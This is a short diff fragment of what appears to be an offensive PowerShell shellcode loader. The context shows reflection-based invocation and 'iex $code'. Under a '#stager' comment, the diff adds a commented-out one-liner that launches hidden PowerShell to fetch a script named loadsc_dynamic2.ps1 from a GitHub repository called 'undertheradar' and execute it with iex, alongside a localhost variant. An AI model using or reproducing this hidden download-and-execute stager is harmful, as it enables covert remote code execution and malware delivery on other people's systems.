@@ -36,4 +36,6 @@ $methodInfo.Invoke($null, @())
 iex $code
 
 #stager
+
 #powershell -w h -c "iwr 'http://localhost:8080/loadsc_dynamic2.ps1' | iex"
+#powershell -w h -c "iwr 'https://raw.githubusercontent.com/g3tsyst3m/undertheradar/refs/heads/main/loadsc_dynamic2.ps1' | iex"
